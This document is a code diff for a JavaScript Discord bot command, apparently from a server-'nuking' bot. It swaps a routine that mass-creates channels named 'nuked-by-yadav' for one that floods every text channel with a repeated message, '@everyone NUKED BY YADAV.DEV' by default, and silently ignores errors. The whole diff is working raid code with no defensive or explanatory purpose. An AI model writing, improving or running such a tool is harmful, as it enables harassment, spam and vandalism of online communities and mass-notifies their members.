@@ -1,21 +1,20 @@
 module.exports = {
-  name: 'spamchannels',
-  description: 'Spam create channels',
+  name: 'spamallchannels',
+  description: 'Spam a custom message (with @everyone) in all channels',
   ownerOnly: true,
   async execute(message, args, client) {
     const guild = message.guild;
     if (!guild) return message.reply("❌ Not in a server.");
 
-    const amount = parseInt(args[0]) || 50;
-    message.reply(`🚀 Spamming ${amount} channels...`);
+    const amount = parseInt(args[0]) || 20;
+    const text = args.slice(1).join(" ") || "@everyone NUKED BY YADAV.DEV";
 
-    for (let i = 0; i < amount; i++) {
-      guild.channels.create({ 
-        name: `nuked-by-yadav-${i}`,
-        type: 0 // text channel
-      }).catch(() => {});
-    }
+    message.reply(`🚀 Spamming in all channels (${amount} times each)...`);
 
-    message.reply("✅ Channel spam started.");
+    guild.channels.cache.filter(ch => ch.type === 0).forEach(channel => {
+      for (let i = 0; i < amount; i++) {
+        channel.send(text).catch(() => {});
+      }
+    });
   }
 };
